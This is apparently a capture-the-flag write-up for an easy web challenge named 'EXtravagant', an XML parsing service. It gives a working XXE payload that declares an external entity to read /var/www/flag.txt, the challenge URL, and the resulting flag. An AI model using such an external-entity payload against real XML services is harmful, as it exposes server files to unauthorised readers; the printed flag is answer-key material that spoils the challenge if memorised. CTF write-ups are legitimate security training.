# EXtravagant
50 points - Web - 510 Solves - easy
Expires in: 00:53:14
Author: NightWolf#0268

I've been working on a XML parsing service. It's not finished but there should be enough for you to try out.

The flag is in /var/www

Press the Start button on the top-right to begin this challenge.

## Solving

Create a XML file to read the flag content in `/var/www/`.

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///var/www/flag.txt'>]>
<root>&read;</root>
```

Upload this file and read use the `View XML` function.

[http://challenge.nahamcon.com:31161/XML?file=text.xml](http://challenge.nahamcon.com:31161/XML?file=text.xml)

flag{639b72f2dd0017f454c44c3863c4e195}
